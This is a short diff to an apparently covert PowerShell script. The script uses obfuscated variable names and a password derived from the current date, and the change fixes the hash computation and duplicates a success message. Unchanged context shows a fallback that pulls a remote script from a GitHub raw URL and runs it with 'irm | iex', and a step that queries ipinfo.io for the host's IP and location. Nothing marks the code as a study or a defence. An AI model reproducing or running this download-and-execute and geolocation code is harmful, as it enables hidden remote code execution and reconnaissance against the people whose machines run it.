@@ -3,7 +3,7 @@ function ConvertTo-PlainText([System.Security.SecureString]$secureString) {
     [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr)
 }
 
-$Zklmhfbwul = (Get-Date).ToString("ddMMyyyy") + "x" | Get-Hash -Algorithm SHA256 | Out-String
+$Zklmhfbwul = [BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString("ddMMyyyy") + "x"))).Replace("-", "")
 $Nzivkqavmg = $Zklmhfbwul.Substring(0, 8)
 
 if ((ConvertTo-PlainText (Read-Host -Prompt "Now?" -AsSecureString)) -ne $Nzivkqavmg) {
@@ -21,6 +21,9 @@ if ((ConvertTo-PlainText (Read-Host -Prompt "Now?" -AsSecureString)) -ne $Nzivkq
     irm https://raw.githubusercontent.com/francisney/inilog/refs/heads/main/tetris.ps1 | iex
     return
 }
+
+Write-Host "Authenticated successfully!"
+
 
 Write-Host "Authenticated successfully!"
 $url = "https://ipinfo.io/json"
